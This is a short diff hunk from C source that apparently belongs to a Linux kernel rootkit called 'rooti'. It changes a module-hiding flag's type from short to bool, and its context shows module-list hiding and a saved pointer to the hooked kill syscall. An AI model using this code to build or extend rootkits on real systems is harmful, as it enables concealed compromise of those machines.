@@ -36,7 +36,7 @@ static LIST_HEAD(rooti_random_tamper_fds);
  * When hidden, the variable rooti_prev_module stores the address of the node that was previous
  * before this module in the list, otherwise it is NULL;
 */
-static short rooti_hidden = false;
+static bool rooti_hidden = false;
 static struct list_head *rooti_prev_module = NULL;
 
 static asmlinkage long (*orig_kill)(const struct pt_regs *regs);
